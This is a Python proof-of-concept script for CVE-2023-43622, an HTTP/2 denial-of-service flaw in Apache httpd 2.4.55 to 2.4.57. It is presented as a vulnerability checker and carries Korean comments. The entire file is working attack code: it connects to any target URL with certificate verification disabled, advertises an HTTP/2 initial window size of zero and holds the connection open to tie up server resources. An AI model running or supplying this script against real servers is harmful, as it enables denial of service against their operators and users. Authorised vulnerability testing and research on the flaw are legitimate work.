# CVE-2023-43622
# DoS in HTTP/2 with initial windows size 0
# version : 2.4.55~2.4.57
# version(reg) : ^2\.4\.(5[5-7])$

import socket
import ssl
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.settings import SettingCodes
from h2.events import DataReceived, ResponseReceived
import time
import argparse
from urllib.parse import urlparse
import threading
import os
import sys


print('''================\n CVE-2023-43622\n DoS in HTTP/2\n================''')

parser = argparse.ArgumentParser(usage="python CVE-2023-43622.py -u <Target URL>")
parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080/)')
args = parser.parse_args()



def Detected_Vulnerability(PROTOCOL, HOST, PORT):
    sock = socket.create_connection((HOST, PORT))

    if PROTOCOL == "https":
        # SSL 컨텍스트 생성 및 인증서 검증 비활성화
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=HOST)


    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()

    #PoC
    #WINDOW_SIZE 값이 0이 아니면 5초만에 연결이 끊깁니다.
    conn.update_settings({SettingCodes.INITIAL_WINDOW_SIZE: 0})
    

    sock.sendall(conn.data_to_send())

    stream_id = 1
    conn.send_headers(stream_id, [(':method', 'GET'), (':path', '/'), (':scheme', PROTOCOL), (':authority', HOST)])
    sock.sendall(conn.data_to_send())

    start_time = time.time()

    while True:
        
        data = sock.recv(65535)
    
        #연결 끊김 -> DoS 아님
        if not data:
            end_time = time.time()
            elapsed_time = end_time - start_time

            print(f"Timeout : {elapsed_time:.4f}")
            print(f"[-] Detected Vulnerability : False")            
            break

        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, ResponseReceived):   
                print("[+] Response header >>", dict(event.headers))
    
            elif isinstance(event, DataReceived):
                print("[+] Response body >>", event.data.decode())

        sock.sendall(conn.data_to_send())


    conn.close_connection()
    sock.sendall(conn.data_to_send())
    sock.close()


#120초 초과 시 DoS로 판단하고 프로그램 종료
def check_timeout(start_time, timeout):
    print("[+] Detecting DoS vulnerability. This may take around 2 minutes . . .\n")
    
    while True:

        if time.time() - start_time > timeout:
            print(f"[*] Detected Vulnerability : True")
            os._exit(1)
        time.sleep(1)

if __name__ == "__main__":
    protocol = urlparse(args.URL).scheme
    host = urlparse(args.URL).hostname
    port = urlparse(args.URL).port

    print("[+] Target :",protocol,host,port)
    

    # 프로그램 종료 타이머
    start_time = time.time()
    timeout_thread = threading.Thread(target=check_timeout, args=(start_time, 120)) 
    timeout_thread.daemon = True 
    timeout_thread.start()

    Detected_Vulnerability(protocol, host, port)